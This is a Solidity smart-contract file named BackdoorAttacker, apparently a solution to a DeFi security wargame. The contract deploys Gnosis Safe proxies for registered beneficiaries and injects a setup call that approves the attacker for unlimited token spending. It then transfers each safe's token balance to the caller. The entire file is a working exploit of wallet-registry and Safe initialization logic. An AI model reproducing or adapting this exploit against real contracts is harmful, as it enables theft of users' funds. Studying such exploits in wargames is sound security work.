// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface GnosisSafe_ {
  function setup(
    address[] calldata _owners,
    uint256 _threshold,
    address to,
    bytes calldata data,
    address fallbackHandler,
    address paymentToken,
    uint256 payment,
    address payable paymentReceiver
  ) external;
}

interface GnosisSafeFactory_ {
  function createProxyWithCallback(
    address _singleton,
    bytes memory initializer,
    uint256 saltNonce,
    address callback
  ) external returns (address proxy);
}

interface Token_ {
  function approve(address _spender, uint256 _value) external returns (bool success);
  function transferFrom(address _from, address _to, uint256 _value) external returns (bool success);
  function balanceOf(address _owner) external view returns (uint256 balance);
}


contract Callback {
  function approveWrapper(address _token, address spender) external {
    Token_(_token).approve(spender, type(uint256).max);
  }
}

contract BackdoorAttacker {

  constructor(
    address _safe, 
    address _safeFactory, 
    address walletRegistry, 
    address[] memory beneficiaries, 
    address _token
  ) {
    
    GnosisSafe_ safe = GnosisSafe_(_safe);
    GnosisSafeFactory_ safeFactory = GnosisSafeFactory_(_safeFactory);
    Token_ token = Token_(_token);
    Callback callback = new Callback(); 

    for (uint256 i = 0; i < beneficiaries.length; i++) {

      address[] memory owners = new address[](1);
      owners[0] = beneficiaries[i];

      bytes memory initializer = abi.encodeWithSelector(
        safe.setup.selector,
        owners,
        1, 
        address(callback), 
        abi.encodeWithSelector(callback.approveWrapper.selector, address(token), address(this)), 
        address(0), 
        address(0),
        0, 
        address(0) 
      );

      address newSafe = safeFactory.createProxyWithCallback(address(safe), initializer, 0, walletRegistry);

      token.transferFrom(newSafe, msg.sender, token.balanceOf(newSafe));

    }
  }
}